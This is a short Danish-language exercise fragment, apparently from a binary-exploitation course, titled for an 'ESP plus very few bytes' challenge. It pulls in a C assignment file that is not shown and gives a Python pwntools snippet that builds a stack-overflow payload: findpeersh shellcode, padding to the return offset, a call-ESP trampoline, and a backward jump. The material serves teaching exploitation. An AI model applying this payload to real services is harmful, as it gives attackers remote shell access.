Udfordringer - 'ESP' + meget få bytes
-------------------------------------
[source,c]
------------------------------------------------
include::../assignments/trampoline_few_bytes[]
------------------------------------------------

[source,python]
------------------------------------------------
SHELLCODE = asm(shellcraft.findpeersh())
PAYLOAD = flat(SHELLCODE,
               'A' * (RET_OFFSET - len(SHELLCODE)),
                CALL_ESP)
PAYLOAD += asm('jmp -%d' % len(PAYLOAD))
